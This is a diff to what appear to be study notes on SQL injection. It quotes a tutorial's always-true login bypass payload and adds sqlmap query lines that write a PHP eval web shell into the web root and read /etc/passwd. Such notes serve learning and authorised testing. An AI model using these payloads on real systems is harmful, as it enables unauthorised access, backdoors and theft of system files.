@@ -75,3 +75,9 @@ Thesis
 <img width="1740" height="881" alt="image" src="https://github.com/user-attachments/assets/f3e2158a-5da6-4862-9a55-401958e2d96e" />
 >To successfully log in once again, we will need an overall true query. This can be achieved by injecting an OR condition into the password field, so it will always return true. Let us try something' or '1'='1 as the password.
 <img width="3578" height="523" alt="image" src="https://github.com/user-attachments/assets/899d7d65-3078-4598-aaed-324c79056b65" />
+
+### Read/Write into file
+```
+--sql-query 'SELECT <?php @eval($_GET[a]);?> INTO OUTFILE "/var/www/html/s.php"'
+--sql-query 'SELECT LOAD_FILE("/etc/passwd")'
+```
